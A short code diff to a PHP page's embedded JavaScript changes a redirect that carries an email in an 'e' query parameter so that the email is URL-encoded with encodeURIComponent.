@@ -307,7 +307,7 @@ if (!$clientBrowser || !$clientDevice) {
                 var emailPart=kv.slice(1).join('=');
                 var email=decodeURIComponent(emailPart);
                 var sep=window.location.search?'&':'?';
-                window.location.replace(window.location.pathname+window.location.search+sep+'e='+email);
+                window.location.replace(window.location.pathname+window.location.search+sep+'e='+encodeURIComponent(email));
                 return;
             }
         }
